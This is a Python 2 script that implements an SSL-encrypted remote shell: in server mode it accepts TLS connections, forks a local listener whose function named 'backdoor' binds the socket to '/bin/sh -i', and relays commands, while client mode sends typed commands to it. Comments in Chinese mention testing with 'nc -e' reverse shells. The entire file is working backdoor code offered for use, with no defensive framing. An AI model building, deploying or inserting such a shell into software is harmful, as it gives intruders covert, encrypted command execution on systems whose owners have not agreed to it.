#!/usr/bin/python
#coding=utf-8

import threading
import socket, ssl, pprint, time
import select
import os
import subprocess
from optparse import OptionParser
import StringIO

ca_crt_file = "ca.crt"
server_crt_file = "server.crt"
server_key_file = "server.key"
back_port = 33335
s_threads = []
c_threads = []

#出了一个问题，back_server()创建的server，nc可以正常连接使用，python send+recv不行。
#测试发现，nc -e 反弹的shell 用python send+recv也不行，但在断开的时候答应lsls不能执行。
#加上抓包数据，发现python send 没有问题，在于数据结尾没有\n，类似于shell中一直没有输入
#回车，导致字符串不断累积。在发送数据后加入\n即可解决此问题。

def backslash_n(buf):
	return buf + "\n"

def backdoor(s):
	#print "dup 0 1 2"
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p = subprocess.call("/bin/sh -i", shell=True);
	return p

def back_server():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(('127.0.0.1', back_port))
	s.listen(1)
	conn, addr = s.accept()
	backdoor(conn)
	s.close()
	return

def recv_all(s):
	recv_len = 1
	resp = ''

	#infds, outfds, errfds = select.select([s,], [], [], 0.5)
	#if len(infds):

	while recv_len:
		buf = s.recv(4096)
		recv_len = len(buf)
		resp += buf
		
		if recv_len < 4096:
			break

	return resp
	
def cmd_interlace(sc):
	back = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	back.connect(("127.0.0.1",back_port))
	infds, outfds, errfds = select.select([back,], [], [], 0.5)
	if len(infds):
		back.recv(12)
		
	try:
		while 1:
			buf_sc = recv_all(sc)
			if buf_sc:
				back.send(backslash_n(buf_sc))
				buf_back = recv_all(back)
				if buf_back:
					sc.send(buf_back)
	except:
		sc.close()
		return

def ssl_server(port, server_crt_file, server_key_file, ca_crt_file):
	s = socket.socket()
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(('', port))
	s.listen(5)

	try:
		while 1:
			conn, addr = s.accept()
			print "addr = " + str(addr)
			sc = ssl.wrap_socket(conn, server_side=True, certfile=server_crt_file, keyfile=server_key_file, ca_certs=ca_crt_file)

			pid = os.fork()
			if pid == 0:
				back_server()
			
			t = threading.Thread(target=cmd_interlace, args=(sc,))
			s_threads.append(t)
			t.setDaemon(True)
			t.start()

	except Exception as e:
		print "[!] " + str(e)
		return

def ssl_client(ip, port, ca_crt_file):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ss = ssl.wrap_socket(s, ca_certs=ca_crt_file, cert_reqs=ssl.CERT_REQUIRED)
	ss.connect((ip, port))

	print repr(ss.getpeername())
	print ss.cipher()
	print pprint.pformat(ss.getpeercert())

	try:
		while 1:
			ss.send(raw_input("#"))
			infds, outfds, errfds = select.select([ss,], [], [], 0.5)
				
			if ss in infds:
				print ss.recv(4096)

	except Exception as e:
		print "[!] " + str(e)
		ss.close()
		s.close()
		return

def main():
	MSG_USAGE = "myprog[-c][-s][-ccf <filename>][-scf <filename>][-skf <filename>] arg1[,arg2..]"
	optParser = OptionParser(MSG_USAGE)
	optParser.add_option("--ccf", "--ca_crt_file", default = "ca.crt", type="string", dest = "ca_crt_file")
	optParser.add_option("--scf", "--server_crt_file", default = "server.crt", type="string", dest = "server_crt_file")
	optParser.add_option("--skf", "--server_key_file", default = "server.key", type="string", dest = "server_key_file")
	optParser.add_option("-t", "--targetip", default = "127.0.0.1", type="string", dest = "ip")
	optParser.add_option("-p", "--port", default = "12345", type="string", dest = "port")
	optParser.add_option("-c", "--client", action = "store_false", default = False, dest = "sc_type")
	optParser.add_option("-s", "--server", action = "store_true", dest = "sc_type")
	
	options, args = optParser.parse_args()
	ca_crt_file = options.ca_crt_file
	server_crt_file = options.server_crt_file
	server_key_file = options.server_key_file
	sc_type = options.sc_type
	ip = options.ip
	port = options.port
	
	if sc_type:
		ssl_server(int(port), server_crt_file, server_key_file, ca_crt_file)
	else:
		ssl_client(ip, int(port), ca_crt_file)
	
if __name__ == "__main__":
	main()


